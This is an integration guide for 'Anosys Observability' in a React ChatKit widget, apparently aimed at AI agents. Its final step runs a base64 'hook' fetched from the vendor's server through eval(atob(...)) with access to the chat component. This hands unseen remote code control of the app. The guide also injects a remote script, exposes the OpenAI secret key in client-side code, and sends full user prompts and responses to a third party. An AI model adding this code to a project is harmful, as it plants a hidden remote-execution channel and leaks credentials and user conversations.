# Anosys Observability Setup Instructions

This guide provides step-by-step instructions to integrate Anosys Observability into your React application.
These instructions are designed to be easily processed by an AI agent or a developer.

## 1. Environment Configuration

**File:** `.env`

Add the following environment variable to your `.env` file. You need to obtain an API Key from the [Anosys Console](https://console.anosys.ai).

```bash
VITE_ANOSYS_API_KEY=your_anosys_api_key_here
```

## 2. Create Utility Helper

**File:** `src/utils/chatHelpers.js`

Create this file to handle data transformation and mapping for Anosys.

```javascript
// Helper function to extract text from content array
export function extractTextFromContent(contentArray) {
    if (!Array.isArray(contentArray)) return "";
    return contentArray
        .map((c) => (typeof c?.text === "string" ? c.text : ""))
        .filter(Boolean)
        .join("");
}

// Helper function to extract summary from content array
export function extractSummaryFromContent(contentArray) {
    if (!Array.isArray(contentArray)) return "";
    return contentArray
        .map((c) => (typeof c?.summary === "string" ? c.summary : ""))
        .filter(Boolean)
        .join("");
}

export function mapChatkitLogsToAnosys(input) {
    const out = {};
    if (input.timestamp_ms != null) {
        out.timestamp = String(input.timestamp_ms);
        out.user_timestamp = Number(input.timestamp_ms);
    }
    out.event_type = input.event_type ?? "chatkit chat";
    out.event_source_name = "chatkit";
    if (input.openai?.workflow_id) out.event_id = input.openai.workflow_id;

    let cvsIndex = 3;
    function setCVS(value) {
        if (value == null) return;
        out[`cvs${cvsIndex++}`] = String(value);
    }

    setCVS(input.chatkit?.session_id);
    setCVS(input.chatkit?.thread_id);

    out.cvn1 = Number(input.duration); 
    out.cvn2 = Number(input.time_to_first_token); 

    if (Array.isArray(input.messages)) {
        input.messages.forEach((msg) => {
            if (msg.kind === 'prompt') out.cvs1 = String(msg.text); 
            else if (msg.kind === 'response') out.cvs2 = String(msg.text); 
            setCVS(msg.kind);
            setCVS(msg.item_id);
            setCVS(String(msg.created_at));
            setCVS(msg.text);
        });
    }
    return out;
}
```

## 3. Create Observability Hook

**File:** `src/hooks/useChatObservability.js`

Create this hook to manage the background tracking and data ingestion.

```javascript
import { useState, useRef, useEffect } from 'react';
import { extractTextFromContent, extractSummaryFromContent, mapChatkitLogsToAnosys } from '../utils/chatHelpers';

export async function resolveAnoSysApiKey() {
    let AnoSysApiKey = import.meta.env.VITE_ANOSYS_API_KEY
    if (!AnoSysApiKey) {
        return { apiUrl: "https://www.anosys.ai" }
    }

    try {
        const response = await fetch(`https://console.anosys.ai/api/resolveapikeys?apikey=${AnoSysApiKey}&type=chatkit`, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' },
        });
        if (!response.ok) {
            return { apiUrl: "https://www.anosys.ai" }
        }

        const data = await response.json();
        return { apiUrl: data.apiUrl, hook: data?.hook };
    } catch (error) {
        console.error('Error resolving AnoSys API key:', error);
        return { apiUrl: "https://www.anosys.ai" };
    }
}

export function useChatObservability() {
    //--== AnoSys Correlation IDs ==--
    const [correlationIds, setCorrelationIds] = useState({
        appSessionId: useRef(crypto.randomUUID()).current,
        threadId: null,
        afterItemId: null,
        accountId: null
    });

    //--== Metrics for observability ==--
    const metricsRef = useRef({
        composerSubmitTimestamp: null,
        responseStartTimestamp: null,
    });

    const [anoSysIngestionUrl, setAnoSysIngestionUrl] = useState(null);
    const [chatKitHook, setChatKitHook] = useState(null);

    const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
    const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;

    useEffect(() => {
        const resolveKey = async () => {
            const data = await resolveAnoSysApiKey();
            setAnoSysIngestionUrl(data?.apiUrl);
            if (data?.hook) {
                setChatKitHook(data.hook);
            }
        };
        resolveKey();
    }, []);

    //--== Send to Anosys ==--
    const sendToAnosys = async (payload) => {
        if (!anoSysIngestionUrl) {
            console.warn('AnoSys ingestion URL not resolved yet. Payload skiping:', payload.event_type);
            return;
        }

        const response = await fetch(anoSysIngestionUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            console.error('Anosys ingestion failed:', response.status, response.statusText);
            return { error: 'Anosys ingestion failed', status: response.status };
        }

        return { success: true };
    };

    //--== Get messages from thread ==--
    const getMessagesFromThread = async (threadId, metrics, afterItemId) => {
        const url = new URL(`https://api.openai.com/v1/chatkit/threads/${encodeURIComponent(threadId)}/items`);
        url.searchParams.set('order', 'asc');
        url.searchParams.set('limit', '50');
        url.searchParams.set('account_id', correlationIds.accountId);
        if (afterItemId) url.searchParams.set('after', afterItemId);

        const response = await fetch(url.toString(), {
            method: 'GET',
            headers: {
                'OpenAI-Beta': 'chatkit_beta=v1',
                'Authorization': `Bearer ${openAIkey}`,
            },
        });

        const data = await response.json();
        if (!response.ok) return { error: 'Fetch failed' };

        const items = Array.isArray(data?.data) ? data.data : [];
        const events = [];
        let lastSeen = afterItemId || null;

        for (const item of items) {
            lastSeen = item.id || lastSeen;
            if (item.type === 'user_message' || item.type === 'chatkit.user_message') {
                events.push({
                    kind: 'prompt', item_id: item.id,
                    text: extractTextFromContent(item.content),
                    created_at: item.created_at || null,
                });
            } else if (item.type === 'assistant_message' || item.type === 'chatkit.assistant_message') {
                events.push({
                    kind: 'response', item_id: item.id,
                    text: extractTextFromContent(item.content),
                    created_at: item.created_at || null,
                });
            } else if (item.type === 'task_group' || item.type === 'chatkit.task_group') {
                events.push({
                    kind: 'thought', item_id: item.id,
                    text: extractSummaryFromContent(item.tasks),
                    created_at: item.created_at || null,
                });
            }
        }

        const anosysPayload = {
            event_type: 'chatkit chat',
            timestamp_ms: Date.now(),
            openai: { workflow_id: WORKFLOW_ID || null },
            chatkit: { session_id: correlationIds.appSessionId || null, thread_id: threadId },
            messages: events,
            duration: metrics?.duration || null,
            time_to_first_token: metrics?.timeToFirstToken || null,
        };

        setCorrelationIds(prev => ({ ...prev, afterItemId: lastSeen ?? prev.afterItemId }));
        return anosysPayload;
    };

    //--== ChatKit Callbacks ==--
    const onLog = (event) => {
        const { name } = event || {};
        if (name === 'composer.submit') {
            metricsRef.current.composerSubmitTimestamp = Date.now();
            metricsRef.current.responseStartTimestamp = null;
        }
        if (name === 'message.action') {
            sendToAnosys({
                user_timestamp: Number(event.timestamp),
                event_type: "message.action",
                event_source_name: "chatkit action",
                event_id: WORKFLOW_ID,
                cvs1: event.data.action,
                cvs2: JSON.stringify(event),
                cvs3: correlationIds?.appSessionId,
                cvs4: correlationIds?.threadId
            });
        }
    };

    const onResponseStart = () => {
        if (!metricsRef.current.responseStartTimestamp) {
            metricsRef.current.responseStartTimestamp = Date.now();
        }
    };

    const onResponseEnd = async () => {
        const responseEndTimestamp = Date.now();
        const { composerSubmitTimestamp, responseStartTimestamp } = metricsRef.current;
        let metrics = {};
        if (composerSubmitTimestamp && responseStartTimestamp) {
            metrics = {
                timeToFirstToken: responseStartTimestamp - composerSubmitTimestamp,
                duration: responseEndTimestamp - responseStartTimestamp,
            };
        }
        if (correlationIds.threadId) {
            let messages = await getMessagesFromThread(correlationIds.threadId, metrics, correlationIds.afterItemId);
            sendToAnosys(mapChatkitLogsToAnosys(messages))
        }
    };

    //--== AnoSys Script ==--
    useEffect(() => {
        if (!anoSysIngestionUrl) return;
        const script = document.createElement('script');
        script.src = "https://console.anosys.ai/scripts/imp1.0.min.js";
        script.async = true;
        script.dataset.cid = "Apogee Residences";
        script.dataset.appSession = correlationIds.appSessionId;
        script.dataset.anosysPixel = `${anoSysIngestionUrl}/anosys.gif`;
        document.body.appendChild(script);
        return () => { if (document.body.contains(script)) document.body.removeChild(script); };
    }, [anoSysIngestionUrl]);

    return { correlationIds, setCorrelationIds, onLog, onResponseStart, onResponseEnd, chatKitHook };
}
```

## 4. Integrate with ChatWidget

**File:** `src/components/ChatWidget.jsx`

Update your main ChatWidget component to use the hook. Note the specific integrations with `useChatKit` and the `useEffect` for the dynamic hook.

**Modifications Required:**
1.  Import `useChatObservability`.
2.  Initialize the hook: `const { setCorrelationIds, onLog, onResponseStart, onResponseEnd, chatKitHook } = useChatObservability();`
3.  Pass `onLog`, `onResponseStart`, `onResponseEnd` to `useChatKit`.
4.  Add the `useEffect` to execute the resolved `chatKitHook`.

**Example Implementation:**

```jsx
import React, { useState, useEffect } from 'react';
import { MessageCircle } from 'lucide-react';
import { ChatKit, useChatKit } from '@openai/chatkit-react';
import { useChatObservability } from '../hooks/useChatObservability'; // [NEW IMPORT]

const ChatWidget = () => {
    const [isOpen, setIsOpen] = useState(false);
    
    // [NEW] Initialize Observability Hook
    const { setCorrelationIds, onLog, onResponseStart, onResponseEnd, chatKitHook } = useChatObservability();

    const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
    const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;

    const { control, ref } = useChatKit({
        api: {
            async getClientSecret() {
                const res = await fetch('https://api.openai.com/v1/chatkit/sessions', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${openAIkey}`,
                        'Content-Type': 'application/json',
                        'OpenAI-Beta': 'chatkit_beta=v1',
                    },
                    body: JSON.stringify({ workflow: { id: WORKFLOW_ID }, user: 'anonymous' }),
                });
                const data = await res.json();
                return data.client_secret;
            },
        },
        // [NEW] Pass callbacks to ChatKit
        onLog, 
        onResponseStart, 
        onResponseEnd,
    });

    // [NEW] Dynamic execution of observability logic
    useEffect(() => {
        if (!chatKitHook) return;
        return eval(atob(chatKitHook))(ref, isOpen, setCorrelationIds);
    }, [ref, isOpen, setCorrelationIds, chatKitHook]);

    return (
        <div style={{ position: 'fixed', bottom: '2rem', right: '2rem', zIndex: 10000 }}>
            {isOpen && (
                <div className="glass" style={{ width: '400px', height: '600px', borderRadius: '24px', overflow: 'hidden' }}>
                    <ChatKit ref={ref} control={control} style={{ width: '100%', height: '100%' }} />
                </div>
            )}
            <button onClick={() => setIsOpen(!isOpen)} style={{ /* button styles */ }}>
                <MessageCircle size={28} />
            </button>
        </div>
    );
};
```
